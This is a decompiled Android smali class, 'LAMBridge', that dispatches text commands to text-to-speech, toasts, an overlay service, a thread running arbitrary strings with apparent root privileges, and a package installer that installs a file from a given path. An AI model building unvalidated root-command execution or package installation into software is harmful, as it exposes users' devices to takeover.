.class public Lcom/architit/radriloniuma/LAMBridge;
.super Ljava/lang/Object;
.source "LAMBridge.java"

# interfaces
.implements Landroid/speech/tts/TextToSpeech$OnInitListener;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/architit/radriloniuma/LAMBridge$BootstrapTask;,
        Lcom/architit/radriloniuma/LAMBridge$ToastTask;,
        Lcom/architit/radriloniuma/LAMBridge$RootTask;
    }
.end annotation


# static fields
.field private static instance:Lcom/architit/radriloniuma/LAMBridge;


# instance fields
.field private mContext:Landroid/content/Context;

.field private tts:Landroid/speech/tts/TextToSpeech;


# direct methods
.method private constructor <init>(Landroid/content/Context;)V
    .locals 1

    .line 25
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 26
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    .line 27
    new-instance p1, Landroid/speech/tts/TextToSpeech;

    iget-object v0, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    invoke-direct {p1, v0, p0}, Landroid/speech/tts/TextToSpeech;-><init>(Landroid/content/Context;Landroid/speech/tts/TextToSpeech$OnInitListener;)V

    iput-object p1, p0, Lcom/architit/radriloniuma/LAMBridge;->tts:Landroid/speech/tts/TextToSpeech;

    .line 28
    return-void
.end method

.method private bootstrapEnvironment()V
    .locals 3

    .line 97
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/architit/radriloniuma/LAMBridge$BootstrapTask;

    const/4 v2, 0x0

    invoke-direct {v1, v2}, Lcom/architit/radriloniuma/LAMBridge$BootstrapTask;-><init>(Lcom/architit/radriloniuma/LAMBridge$1;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 98
    return-void
.end method

.method public static execute(Ljava/lang/String;)V
    .locals 1

    .line 101
    sget-object v0, Lcom/architit/radriloniuma/LAMBridge;->instance:Lcom/architit/radriloniuma/LAMBridge;

    if-eqz v0, :cond_0

    .line 102
    invoke-direct {v0, p0}, Lcom/architit/radriloniuma/LAMBridge;->executeNative(Ljava/lang/String;)V

    .line 104
    :cond_0
    return-void
.end method

.method private executeNative(Ljava/lang/String;)V
    .locals 3

    .line 107
    const-string v0, "speak "

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    const/4 v1, 0x6

    if-eqz v0, :cond_1

    .line 108
    invoke-virtual {p1, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    .line 109
    iget-object v0, p0, Lcom/architit/radriloniuma/LAMBridge;->tts:Landroid/speech/tts/TextToSpeech;

    if-eqz v0, :cond_0

    .line 110
    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-virtual {v0, p1, v1, v2, v2}, Landroid/speech/tts/TextToSpeech;->speak(Ljava/lang/CharSequence;ILandroid/os/Bundle;Ljava/lang/String;)I

    .line 112
    :cond_0
    goto/16 :goto_1

    :cond_1
    const-string v0, "toast "

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 113
    invoke-virtual {p1, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    .line 114
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/architit/radriloniuma/LAMBridge$ToastTask;

    iget-object v2, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    invoke-direct {v1, v2, p1}, Lcom/architit/radriloniuma/LAMBridge$ToastTask;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 115
    goto/16 :goto_1

    :cond_2
    const-string v0, "float "

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 116
    invoke-virtual {p1, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    .line 117
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_3

    iget-object v0, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    invoke-static {v0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_3

    .line 118
    new-instance p1, Landroid/content/Intent;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "package:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    .line 119
    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    const-string v1, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    invoke-direct {p1, v1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 120
    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 121
    iget-object v0, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 122
    return-void

    .line 124
    :cond_3
    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    const-class v2, Lcom/architit/radriloniuma/LAMFloatingService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 125
    const-string v1, "content"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 126
    iget-object p1, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 127
    goto :goto_1

    :cond_4
    const-string v0, "float_hide"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 128
    new-instance p1, Landroid/content/Intent;

    iget-object v0, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    const-class v1, Lcom/architit/radriloniuma/LAMFloatingService;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 129
    iget-object v0, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    .line 130
    goto :goto_1

    :cond_5
    const-string v0, "root "

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 131
    const/4 v0, 0x5

    invoke-virtual {p1, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    .line 132
    invoke-direct {p0, p1}, Lcom/architit/radriloniuma/LAMBridge;->executeRoot(Ljava/lang/String;)V

    goto :goto_0

    .line 133
    :cond_6
    const-string v0, "update "

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 134
    const/4 v0, 0x7

    invoke-virtual {p1, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    .line 135
    invoke-direct {p0, p1}, Lcom/architit/radriloniuma/LAMBridge;->installUpdate(Ljava/lang/String;)V

    goto :goto_1

    .line 133
    :cond_7
    :goto_0
    nop

    .line 137
    :goto_1
    return-void
.end method

.method private executeRoot(Ljava/lang/String;)V
    .locals 2

    .line 192
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/architit/radriloniuma/LAMBridge$RootTask;

    invoke-direct {v1, p1}, Lcom/architit/radriloniuma/LAMBridge$RootTask;-><init>(Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 193
    return-void
.end method

.method public static init(Landroid/content/Context;)V
    .locals 1

    .line 38
    sget-object v0, Lcom/architit/radriloniuma/LAMBridge;->instance:Lcom/architit/radriloniuma/LAMBridge;

    if-nez v0, :cond_0

    .line 39
    new-instance v0, Lcom/architit/radriloniuma/LAMBridge;

    invoke-direct {v0, p0}, Lcom/architit/radriloniuma/LAMBridge;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/architit/radriloniuma/LAMBridge;->instance:Lcom/architit/radriloniuma/LAMBridge;

    .line 40
    invoke-direct {v0}, Lcom/architit/radriloniuma/LAMBridge;->bootstrapEnvironment()V

    .line 42
    :cond_0
    return-void
.end method

.method private installUpdate(Ljava/lang/String;)V
    .locals 8

    .line 141
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 142
    iget-object p1, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/pm/PackageManager;->getPackageInstaller()Landroid/content/pm/PackageInstaller;

    move-result-object p1

    .line 143
    new-instance v1, Landroid/content/pm/PackageInstaller$SessionParams;

    const/4 v2, 0x1

    invoke-direct {v1, v2}, Landroid/content/pm/PackageInstaller$SessionParams;-><init>(I)V

    .line 145
    invoke-virtual {p1, v1}, Landroid/content/pm/PackageInstaller;->createSession(Landroid/content/pm/PackageInstaller$SessionParams;)I

    move-result v1

    .line 146
    invoke-virtual {p1, v1}, Landroid/content/pm/PackageInstaller;->openSession(I)Landroid/content/pm/PackageInstaller$Session;

    move-result-object p1

    .line 148
    const-string v3, "package"

    const-wide/16 v4, 0x0

    const-wide/16 v6, -0x1

    move-object v2, p1

    invoke-virtual/range {v2 .. v7}, Landroid/content/pm/PackageInstaller$Session;->openWrite(Ljava/lang/String;JJ)Ljava/io/OutputStream;

    move-result-object v2

    .line 149
    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, v0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 150
    const/high16 v0, 0x10000

    new-array v0, v0, [B

    .line 152
    :goto_0
    invoke-virtual {v3, v0}, Ljava/io/InputStream;->read([B)I

    move-result v4

    const/4 v5, -0x1

    if-eq v4, v5, :cond_0

    .line 153
    const/4 v5, 0x0

    invoke-virtual {v2, v0, v5, v4}, Ljava/io/OutputStream;->write([BII)V

    goto :goto_0

    .line 155
    :cond_0
    invoke-virtual {p1, v2}, Landroid/content/pm/PackageInstaller$Session;->fsync(Ljava/io/OutputStream;)V

    .line 156
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 157
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    .line 159
    nop

    .line 160
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x17

    if-lt v0, v2, :cond_1

    .line 161
    const/high16 v0, 0xc000000

    goto :goto_1

    .line 160
    :cond_1
    const/high16 v0, 0x8000000

    .line 163
    :goto_1
    new-instance v2, Landroid/content/Intent;

    const-string v3, "com.architit.radriloniuma.INSTALL_COMPLETE"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 164
    iget-object v3, p0, Lcom/architit/radriloniuma/LAMBridge;->mContext:Landroid/content/Context;

    invoke-static {v3, v1, v2, v0}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 170
    invoke-virtual {v0}, Landroid/app/PendingIntent;->getIntentSender()Landroid/content/IntentSender;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/pm/PackageInstaller$Session;->commit(Landroid/content/IntentSender;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 173
    goto :goto_2

    .line 171
    :catch_0
    move-exception p1

    .line 172
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    .line 174
    :goto_2
    return-void
.end method


# virtual methods
.method public onInit(I)V
    .locals 3

    .line 32
    if-nez p1, :cond_0

    .line 33
    iget-object p1, p0, Lcom/architit/radriloniuma/LAMBridge;->tts:Landroid/speech/tts/TextToSpeech;

    new-instance v0, Ljava/util/Locale;

    const-string v1, "ru"

    const-string v2, "RU"

    invoke-direct {v0, v1, v2}, Ljava/util/Locale;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p1, v0}, Landroid/speech/tts/TextToSpeech;->setLanguage(Ljava/util/Locale;)I

    .line 35
    :cond_0
    return-void
.end method
